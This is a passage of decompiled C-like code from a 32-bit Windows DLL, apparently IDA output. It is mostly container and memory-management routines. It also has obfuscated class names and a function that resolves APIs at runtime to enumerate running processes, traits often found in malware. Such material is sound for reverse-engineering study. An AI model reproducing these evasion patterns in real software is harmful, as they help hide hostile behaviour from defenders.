int __thiscall sub_100277C6(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100277FC) --------------------------------------------------------
int __thiscall sub_100277FC(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10027824) --------------------------------------------------------
int __thiscall sub_10027824(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002785F) --------------------------------------------------------
int __thiscall sub_1002785F(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002787B) --------------------------------------------------------
_DWORD *__thiscall sub_1002787B(_DWORD *Block, char a2)
{
  sub_100275DB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002789A) --------------------------------------------------------
_DWORD *__thiscall sub_1002789A(_DWORD *Block, char a2)
{
  sub_10027745(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100278D7) --------------------------------------------------------
_DWORD *__userpurge sub_100278D7@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  void *v5; // [esp-4h] [ebp-20h]

  sub_1002800C(a2);
  *a2 = &off_100745D0;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10027CE0(a2, v2, v4, v5);
  return a2;
}
// 100745D0: using guessed type int (__thiscall *off_100745D0)(void *Block, char);

//----- (10027925) --------------------------------------------------------
_DWORD *__stdcall sub_10027925(_DWORD *a1)
{
  sub_1002800C(a1);
  *a1 = &off_100745D0;
  sub_10028037(a1);
  return a1;
}
// 100745D0: using guessed type int (__thiscall *off_100745D0)(void *Block, char);

//----- (10027957) --------------------------------------------------------
int *__thiscall sub_10027957(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100279AE) --------------------------------------------------------
void __thiscall sub_100279AE(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_100745D0;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10027267(this);
}
// 100745D0: using guessed type int (__thiscall *off_100745D0)(void *Block, char);

//----- (10027A11) --------------------------------------------------------
int __thiscall sub_10027A11(_DWORD *this)
{
  return this[1];
}

//----- (10027A15) --------------------------------------------------------
int __thiscall sub_10027A15(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // edi
  int result; // eax
  int v10; // [esp+18h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008E37F);
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 12 * v7;
    v10 = v7 - a3;
    do
    {
      sub_10026AF2(this[3] + v8 - 12, this[3] + v8);
      v8 -= 12;
      --v10;
    }
    while ( v10 );
  }
  result = sub_10026AF2(a2, this[3] + 12 * a3);
  ++this[1];
  return result;
}

//----- (10027A89) --------------------------------------------------------
int __thiscall sub_10027A89(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10027AA4) --------------------------------------------------------
int __thiscall sub_10027AA4(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E389);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 12 * a2;
    do
    {
      sub_10026AF2(this[3] + v5 + 12, this[3] + v5);
      ++v4;
      v5 += 12;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10026AF2((int)&unk_10095820, this[3] + 12 * v6);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10027B11) --------------------------------------------------------
int __thiscall sub_10027B11(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E38A);
  return this[3] + 12 * a2;
}

//----- (10027B32) --------------------------------------------------------
int __thiscall sub_10027B32(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E38B);
  return this[3] + 12 * a2;
}

//----- (10027B53) --------------------------------------------------------
void __thiscall sub_10027B53(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (10027B8E) --------------------------------------------------------
int __thiscall sub_10027B8E(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10027BC7) --------------------------------------------------------
BOOL __thiscall sub_10027BC7(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10027BD2) --------------------------------------------------------
int __thiscall sub_10027BD2(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // edi
  int v5; // eax

  v2 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 12 * a2;
    do
    {
      sub_10026AF2((int)&unk_10095820, v4 + this[3]);
      ++a2;
      v4 += 12;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10027C29) --------------------------------------------------------
unsigned int __thiscall sub_10027C29(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E395);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10027CA5) --------------------------------------------------------
unsigned int __thiscall sub_10027CA5(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10027CCD) --------------------------------------------------------
unsigned int __stdcall sub_10027CCD(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10027CE0) --------------------------------------------------------
unsigned int __thiscall sub_10027CE0(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (12 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 12 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0xCu,
      v5,
      (void (__thiscall *)(void *))sub_100268AE,
      (void (__thiscall *)(void *))sub_10026929);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      sub_10026AF2(v12 + a3, v12 + this[3]);
      ++v10;
      v12 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10027D86) --------------------------------------------------------
void __thiscall sub_10027D86(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  char *v6; // ebx
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  int v10; // edi
  char *i; // eax
  unsigned int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  int v14; // [esp+1Ch] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v13 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (char *)this[3];
    v7 = (12 * (unsigned __int64)(unsigned int)v13) >> 32 != 0 ? -1 : 12 * v13;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = v8 + 1;
      *v8 = v13;
      `eh vector constructor iterator'(
        v8 + 1,
        0xCu,
        v13,
        (void (__thiscall *)(void *))sub_100268AE,
        (void (__thiscall *)(void *))sub_10026929);
      v14 = (int)v9;
    }
    else
    {
      v14 = 0;
    }
    v12 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = v14;
      for ( i = &v6[-v14]; ; i = &v6[-v14] )
      {
        sub_10026AF2((int)&i[v10], v10);
        ++v12;
        v10 += 12;
        if ( v12 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v14;
    if ( v6 )
    {
      if ( *((_DWORD *)v6 - 1) )
        (**(void (__thiscall ***)(char *, int))v6)(v6, 3);
      else
        j__free(v6 - 4);
    }
    this[2] = v13;
  }
}

//----- (10027EAF) --------------------------------------------------------
_DWORD *__userpurge sub_10027EAF@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10027EEE) --------------------------------------------------------
void __thiscall sub_10027EEE(void *this)
{
  sub_100280B2((int)this);
}

//----- (10027F33) --------------------------------------------------------
_DWORD *__userpurge sub_10027F33@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10027F72) --------------------------------------------------------
void __thiscall sub_10027F72(void *this)
{
  sub_100280EC((int)this);
}

//----- (10027FA3) --------------------------------------------------------
_DWORD *__thiscall sub_10027FA3(_DWORD *Block, char a2)
{
  sub_100279AE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10027FC2) --------------------------------------------------------
char *__thiscall sub_10027FC2(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0xCu, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_10026929);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_10026929(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (1002800C) --------------------------------------------------------
_DWORD *__stdcall sub_1002800C(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_1007462C;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007462C: using guessed type int (__thiscall *off_1007462C)(void *Block, char);

//----- (10028037) --------------------------------------------------------
void __usercall sub_10028037(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0xC4u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0xCu,
      16,
      (void (__thiscall *)(void *))sub_100268AE,
      (void (__thiscall *)(void *))sub_10026929);
  }
  a1[3] = v1;
}

//----- (100280B2) --------------------------------------------------------
void __usercall sub_100280B2(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100280EC) --------------------------------------------------------
void __usercall sub_100280EC(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10028128) --------------------------------------------------------
_DWORD *__stdcall sub_10028128(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  sub_10009D2C(a1 + 2, &word_1008E5CC);
  return a1;
}

//----- (1002815A) --------------------------------------------------------
_DWORD *__stdcall sub_1002815A(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  *a1 = a2;
  a1[1] = a3;
  sub_10009F32(a1 + 2, (int)&a4);
  sub_10009F65(&a4);
  return a1;
}

//----- (100281A2) --------------------------------------------------------
_DWORD *__stdcall sub_100281A2(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 8);
  return a2;
}

//----- (100281D7) --------------------------------------------------------
void __cdecl sub_100281D7(_DWORD *a1)
{
  DWORD v1; // ecx
  DWORD v2; // ecx
  DWORD v3; // ecx
  void *v4; // eax
  int v5; // ecx
  int v6; // [esp-10h] [ebp-29Ch] BYREF
  int v7; // [esp-Ch] [ebp-298h]
  DWORD v8; // [esp-8h] [ebp-294h] BYREF
  DWORD v9; // [esp-4h] [ebp-290h]
  int v10[6]; // [esp+0h] [ebp-28Ch] BYREF
  int v11; // [esp+18h] [ebp-274h] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-270h] BYREF
  int v13; // [esp+28h] [ebp-264h]
  void *v14; // [esp+2Ch] [ebp-260h]
  int v15; // [esp+30h] [ebp-25Ch] BYREF
  char *v16; // [esp+34h] [ebp-258h]
  _DWORD *v17; // [esp+38h] [ebp-254h]
  void *v18; // [esp+3Ch] [ebp-250h]
  void *v19; // [esp+40h] [ebp-24Ch]
  bool v20; // [esp+47h] [ebp-245h]
  int v21[9]; // [esp+48h] [ebp-244h] BYREF
  wchar_t Source[270]; // [esp+6Ch] [ebp-220h] BYREF
  int v23; // [esp+288h] [ebp-4h]

  v23 = 0;
  v17 = a1;
  v13 = 0;
  v19 = v10;
  sub_10009F32(v10, (int)&unk_10095600);
  v23 = 1;
  v9 = v1;
  v8 = v1;
  v18 = &v8;
  sub_10009F32(&v8, (int)&unk_10095608);
  LOBYTE(v23) = 0;
  v16 = sub_100265E5(v8, v9, v10[0]);
  v19 = v10;
  sub_10009F32(v10, (int)&unk_100955F0);
  v23 = 3;
  v9 = v2;
  v8 = v2;
  v18 = &v8;
  sub_10009F32(&v8, (int)&unk_10095608);
  LOBYTE(v23) = 0;
  v18 = sub_100265E5(v8, v9, v10[0]);
  v19 = v10;
  sub_10009F32(v10, (int)&unk_100955F8);
  v23 = 5;
  v9 = v3;
  v8 = v3;
  v14 = &v8;
  sub_10009F32(&v8, (int)&unk_10095608);
  LOBYTE(v23) = 0;
  v19 = sub_100265E5(v8, v9, v10[0]);
  v10[1] = GetCurrentProcessId();
  v10[0] = GetCurrentProcessId();
  v9 = 0;
  v8 = 0;
  v4 = (void *)((int (*)(void))v16)();
  sub_10025D50((int)&v15, v4, 2, 0, v8, v9);
  v23 = 7;
  if ( !sub_1000F24B((int)&v15) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10015379(v17);
  v13 = 1;
  v21[0] = 556;
  if ( ((int (__cdecl *)(char *, int *))v18)(v16, v21) == 1 )
  {
    do
    {
      v7 = v5;
      v6 = v5;
      v14 = &v6;
      sub_10009D2C(&v6, Source);
      LOBYTE(v23) = 7;
      sub_1002815A(&v11, v21[2], v21[6], v6, v7);
      LOBYTE(v23) = 9;
      sub_10015682(v17, (int)&v11);
      v20 = ((int (__cdecl *)(char *, int *))v19)(v16, v21) != 1;
      LOBYTE(v23) = 7;
      sub_100100D0((int)&v11);
    }
    while ( !v20 );
  }
  LOBYTE(v23) = 0;
  sub_1000F1E1(&v15);
  sub_10056753();
}
// 10028215: variable 'v1' is possibly undefined
// 1002825A: variable 'v2' is possibly undefined
// 1002829A: variable 'v3' is possibly undefined
// 1002834D: variable 'v5' is possibly undefined
// 100281D7: using guessed type _DWORD pExceptionObject[3];
// 100281D7: using guessed type wchar_t Source[270];

//----- (100283EC) --------------------------------------------------------
void __noreturn sub_100283EC()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_1000E2E3(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 100283EC: using guessed type void __noreturn sub_100283EC();
// 100283EC: using guessed type _DWORD pExceptionObject[3];

//----- (1002840F) --------------------------------------------------------
_DWORD *__stdcall sub_1002840F(_DWORD *a1, int a2)
{
  sub_10015909(a1);
  *a1 = &off_100739D8;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  sub_100158AD(a2, (int)a1);
  return a1;
}
// 100739D8: using guessed type int (__thiscall *off_100739D8)(void *Block, char);

//----- (1002844E) --------------------------------------------------------
_DWORD *__stdcall sub_1002844E(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax

  sub_1001EB43(a1, 0, 0);
  *a1 = &off_100736F0;
  v1 = operator new(0x40u);
  if ( v1 )
    v2 = sub_100285C3(v1, -1);
  else
    v2 = 0;
  sub_100292D6(a1 + 3, (int)v2);
  a1[5] = -1;
  return a1;
}
// 100736F0: using guessed type int (__thiscall *off_100736F0)(void *Block, char);

//----- (100284B3) --------------------------------------------------------
_DWORD *__stdcall sub_100284B3(_DWORD *a1, int a2, void *a3, void *Block)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *Blocka; // [esp+30h] [ebp+14h]

  sub_1001EB43(a1, a3, (char)Block);
  *a1 = &off_100736F0;
  Blocka = operator new(0x40u);
  if ( Blocka )
  {
    v4 = sub_10013422(a1);
    v5 = sub_100285C3(Blocka, v4);
  }
  else
  {
    v5 = 0;
  }
  sub_100292D6(a1 + 3, (int)v5);
  a1[5] = a2;
  return a1;
}
// 100736F0: using guessed type int (__thiscall *off_100736F0)(void *Block, char);

//----- (10028524) --------------------------------------------------------
_DWORD *__userpurge sub_10028524@<eax>(int a1@<edi>, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *Block; // [esp+10h] [ebp-10h]

  sub_100114E7(a1, a2);
  *a2 = &off_100736F0;
  Block = operator new(0x40u);
  if ( Block )
  {
    v2 = sub_10013422(a2);
    v3 = sub_100285C3(Block, v2);
  }
  else
  {
    v3 = 0;
  }
  sub_100292D6(a2 + 3, (int)v3);
  a2[5] = 128;
  return a2;
}
// 100736F0: using guessed type int (__thiscall *off_100736F0)(void *Block, char);

//----- (10028590) --------------------------------------------------------
void __thiscall sub_10028590(int *this)
{
  *this = (int)&off_100736F0;
  sub_100115C6(this + 3);
  sub_10009696(this);
}
// 100736F0: using guessed type int (__thiscall *off_100736F0)(void *Block, char);

//----- (100285C3) --------------------------------------------------------
_DWORD *__stdcall sub_100285C3(_DWORD *a1, int a2)
{
  a1[2] = 0;
  a1[1] = a2;
  *a1 = off_100746E4;
  sub_10028830(a1 + 3);
  sub_10012CF1((int)(a1 + 7));
  return a1;
}
// 100746E4: using guessed type int (__thiscall *off_100746E4[2])(void *Block, char);

//----- (10028606) --------------------------------------------------------
int *__thiscall sub_10028606(int *Block, char a2)
{
  sub_10028625(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028625) --------------------------------------------------------
void __thiscall sub_10028625(int *this)
{
  *this = (int)off_100746E4;
  while ( this[2] )
    sub_10028766(this);
  sub_10012D7D(this + 7);
  sub_10028867(this + 3);
}
// 100746E4: using guessed type int (__thiscall *off_100746E4[2])(void *Block, char);

//----- (10028686) --------------------------------------------------------
int __stdcall sub_10028686(_DWORD *a1)
{
  int v1; // eax
  int v3[22]; // [esp+10h] [ebp-B4h] BYREF
  char v4; // [esp+68h] [ebp-5Ch]
  int v5[3]; // [esp+9Ch] [ebp-28h] BYREF
  _DWORD v6[3]; // [esp+A8h] [ebp-1Ch] BYREF
  int v7; // [esp+C0h] [ebp-4h]

  sub_10012C8B(a1 + 7, v6);
  v7 = 0;
  v1 = a1[2];
  if ( v1 )
  {
    a1[2] = v1 + 1;
  }
  else
  {
    a1[2] = 1;
    sub_1003011F((int)v3, a1[1]);
    LOBYTE(v7) = 2;
    while ( !v4 )
    {
      sub_100305D1((void **)v3, v5);
      LOBYTE(v7) = 3;
      sub_1000F4FF(v5);
      (*(void (__thiscall **)(_DWORD *, int *))(a1[3] + 36))(a1 + 3, v5);
      sub_100303FA((int)v3);
      LOBYTE(v7) = 2;
      sub_1000F307(v5);
    }
    v7 = 0;
    sub_10030379(v3);
  }
  v7 = -1;
  return sub_10012CBF(v6);
}
// 10028686: using guessed type _DWORD var_1C[3];
// 10028686: using guessed type int var_28[3];

//----- (10028766) --------------------------------------------------------
int __usercall sub_10028766@<eax>(_DWORD *a1@<esi>)
{
  unsigned int v1; // eax
  int v2; // eax
  _DWORD v4[2]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD v5[3]; // [esp+14h] [ebp-18h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  sub_10012C8B(a1 + 7, v5);
  v6 = 0;
  v1 = a1[2];
  if ( v1 <= 1 )
  {
    a1[2] = v1 - 1;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(a1[3] + 12))(a1 + 3, v4);
    LOBYTE(v6) = 1;
    while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 4))(v4[0]) )
    {
      v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 12))(v4[0]);
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2);
      (*(void (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 24))(v4[0]);
    }
    LOBYTE(v6) = 0;
    sub_1002936B(v4);
  }
  else
  {
    a1[2] = v1 - 1;
  }
  v6 = -1;
  return sub_10012CBF(v5);
}
// 10028766: using guessed type _DWORD var_18[3];

//----- (10028830) --------------------------------------------------------
_DWORD *__stdcall sub_10028830(_DWORD *a1)
{
  sub_10028DCA(a1);
  *a1 = &off_100746E8;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 100746E8: using guessed type int (__thiscall *off_100746E8)(void *Block, char);

//----- (10028867) --------------------------------------------------------
void __thiscall sub_10028867(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_100746E8;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[3];
    sub_10028CD4(i);
  }
  sub_10028A44(this);
}
// 100746E8: using guessed type int (__thiscall *off_100746E8)(void *Block, char);

//----- (100288BE) --------------------------------------------------------
void *__thiscall sub_100288BE(void *this, int a2)
{
  sub_10028D6E(a2, (int)this);
  return this;
}

//----- (100288D3) --------------------------------------------------------
void *__thiscall sub_100288D3(void *this, int a2)
{
  sub_10028D6E(a2, (int)this);
  return this;
}

//----- (100288E8) --------------------------------------------------------
int __thiscall sub_100288E8(_DWORD *this)
{
  return this[3];
}

//----- (100288EC) --------------------------------------------------------
_DWORD *__thiscall sub_100288EC(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10028E66(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_1002932C(a2, (int)v4);
  return a2;
}

//----- (10028942) --------------------------------------------------------
_DWORD *__thiscall sub_10028942(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10029050(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_100293B0(a2, (int)v4);
  return a2;
}

//----- (10028998) --------------------------------------------------------
_DWORD *__thiscall sub_10028998(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10028E66(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_1002932C(a2, (int)v4);
  return a2;
}

//----- (100289EE) --------------------------------------------------------
_DWORD *__thiscall sub_100289EE(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10029050(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_100293B0(a2, (int)v4);
  return a2;
}

//----- (10028A44) --------------------------------------------------------
void __thiscall sub_10028A44(_DWORD *this)
{
